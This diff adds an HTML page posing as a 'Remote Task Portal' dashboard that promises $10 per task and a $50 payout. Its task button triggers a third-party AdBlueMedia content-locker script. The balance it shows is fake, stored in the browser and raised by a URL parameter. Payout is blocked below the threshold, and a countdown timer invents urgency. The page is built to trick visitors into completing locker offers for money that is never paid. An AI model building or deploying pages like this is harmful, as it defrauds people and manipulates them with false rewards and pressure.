@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Active Dashboard - Remote Task Portal</title>
+    <style>
+        :root {
+            --primary: #2563eb;
+            --success: #10b981;
+            --dark: #0f172a;
+            --light: #f8fafc;
+            --gray: #64748b;
+            --border: #e2e8f0;
+        }
+        body { font-family: 'Inter', system-ui, -apple-system, sans-serif; background: var(--light); margin: 0; padding: 20px; color: var(--dark); }
+        .container { max-width: 800px; margin: 20px auto; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.04); border: 1px solid var(--border); }
+        .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border); padding-bottom: 15px; margin-bottom: 25px; }
+        .header h3 { margin: 0; color: var(--dark); font-size: 1.1rem; }
+        
+        .balance-box { background: linear-gradient(135deg, #f0fdf4, #dcfce7); border: 1px solid #bbf7d0; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
+        .balance-flex { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
+        .progress-container { background: #cbd5e1; border-radius: 10px; height: 10px; width: 100%; overflow: hidden; position: relative; }
+        .progress-bar { background: var(--success); height: 100%; width: 0%; transition: width 0.5s ease-in-out; }
+        .progress-text { font-size: 12px; color: #334155; margin-top: 8px; display: flex; justify-content: space-between; font-weight: 600; }
+
+        .urgency-banner { background: #fef3c7; color: #92400e; padding: 12px 15px; border-radius: 8px; font-size: 13px; margin-bottom: 20px; border-left: 4px solid #f59e0b; display: flex; align-items: center; justify-content: space-between; }
+
+        .task-card { border: 1px solid var(--border); padding: 20px; border-radius: 10px; margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center; background: white; box-shadow: 0 1px 2px rgba(0,0,0,0.02); }
+        .btn-task { background: var(--success); color: white; padding: 10px 20px; text-decoration: none; border-radius: 6px; font-weight: bold; font-size: 14px; box-shadow: 0 2px 5px rgba(16, 185, 129, 0.2); transition: background 0.2s; }
+        .btn-task:hover { background: #059669; }
+        .btn-withdraw { background: #f97316; color: white; padding: 12px 25px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 14px; transition: background 0.2s; }
+        .btn-withdraw:hover { background: #ea580c; }
+        
+        .alert { background: #f0fdf4; color: #166534; padding: 12px 15px; border-radius: 8px; margin-bottom: 20px; display: none; font-weight: 500; border-left: 4px solid var(--success); border: 1px solid #bbf7d0; }
+    </style>
+
+    <!-- AdBlueMedia Locker Script Integration -->
+    <script type="text/javascript">
+    var KkhnN_LJi_hMGTzc = {"it":4631647,"key":"d9479"};
+    </script>
+    <script src="https://dlchbu4sfo2xhu.cloudfront.net/0b02a01.js"></script>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h3 id="sessionUser">Active Session: Contributor</h3>
+            <a href="index.html" style="color: #ef4444; text-decoration: none; font-size: 13px; font-weight: 600;">Terminate Session</a>
+        </div>
+
+        <div id="success-alert" class="alert">Protocol verified! $10.00 successfully credited to your active ledger.</div>
+
+        <div class="urgency-banner">
+            <span>⚠️ Active session has a temporary timeout. Complete remaining compliance slots to secure accumulated balance.</span>
+            <span id="countdown" style="font-weight: bold;">14:59</span>
+        </div>
+
+        <div class="balance-box">
+            <div class="balance-flex">
+                <div>
+                    <span style="font-size: 11.5px; color: var(--gray); display: block; font-weight: 600; text-transform: uppercase;">Active Ledger Balance</span>
+                    <span style="font-size: 26px; font-weight: 800; color: #166534;">$<span id="balance">0.00</span></span>
+                </div>
+                <div style="text-align: right;">
+                    <span style="font-size: 11.5px; color: var(--gray); display: block; font-weight: 600; text-transform: uppercase;">Payout Threshold</span>
+                    <span style="font-size: 18px; font-weight: 700; color: var(--dark);">$50.00</span>
+                </div>
+            </div>
+            <div class="progress-container">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+            <div class="progress-text">
+                <span id="progress-percent">0% Toward Payout Target</span>
+                <span>Remaining: $<span id="remaining">50.00</span></span>
+            </div>
+        </div>
+
+        <h4 style="color: var(--dark); margin-bottom: 15px; font-size: 1rem;">Assigned Protocol Tasks (Available Slots: 3)</h4>
+        
+        <div class="task-card">
+            <div>
+                <strong>Digital System Evaluation & Validation (Priority Slot #101)</strong><br>
+                <small style="color: var(--gray);">Estimated Duration: 2 Mins | Reward: $10.00</small>
+            </div>
+            <!-- Trigger AdBlueMedia Locker -->
+            <button onclick="_Jf()" class="btn-task" style="border: none; cursor: pointer;">Execute Protocol &rarr;</button>
+        </div>
+
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 30px; border-top: 1px solid var(--border); padding-top: 20px;">
+            <span style="font-size: 13px; color: var(--gray);">Node Status: <strong style="color: var(--success);">Encrypted & Synchronized</strong></span>
+            <button class="btn-withdraw" onclick="checkWithdraw()">Request Payout Transfer</button>
+        </div>
+    </div>
+
+    <script>
+        // Tangkap email dari URL parameter
+        const urlParams = new URLSearchParams(window.location.search);
+        const userEmail = urlParams.get('user_email');
+        if (userEmail) {
+            document.getElementById('sessionUser').innerText = "Active Session: " + decodeURIComponent(userEmail);
+        }
+
+        // Logika Saldo & Storage
+        let currentBalance = parseFloat(localStorage.getItem('rtp_balance')) || 0.00;
+        updateDashboard(currentBalance);
+
+        if (urlParams.has('completed')) {
+            currentBalance += 10.00;
+            localStorage.setItem('rtp_balance', currentBalance);
+            updateDashboard(currentBalance);
+            document.getElementById('success-alert').style.display = 'block';
+            // Bersihkan parameter completed dari URL agar bersih
+            window.history.replaceState({}, document.title, window.location.pathname + (userEmail ? "?user_email=" + encodeURIComponent(userEmail) : ""));
+        }
+
+        function updateDashboard(balance) {
+            document.getElementById('balance').innerText = balance.toFixed(2);
+            let percentage = (balance / 50.00) * 100;
+            if (percentage > 100) percentage = 100;
+            document.getElementById('progressBar').style.width = percentage + '%';
+            document.getElementById('progress-percent').innerText = Math.round(percentage) + '% Toward Payout Target';
+            
+            let remaining = 50.00 - balance;
+            if (remaining < 0) remaining = 0;
+            document.getElementById('remaining').innerText = remaining.toFixed(2);
+        }
+
+        function checkWithdraw() {
+            if (currentBalance < 50.00) {
+                alert("Transfer Suspended:\n\nYour active ledger has not met the minimum payout threshold of $50.00.\n\nComplete remaining task protocols above to unlock automated payout routing.");
+            } else {
+                alert("Target threshold verified. Please configure your preferred transfer destination.");
+            }
+        }
+
+        // Countdown Timer
+        let time = 899;
+        setInterval(() => {
+            let minutes = Math.floor(time / 60);
+            let seconds = time % 60;
+            document.getElementById('countdown').innerText = 
+                (minutes < 10 ? "0" : "") + minutes + ":" + (seconds < 10 ? "0" : "") + seconds;
+            if (time > 0) time--;
+        }, 1000);
+    </script>
+</body>
+</html>
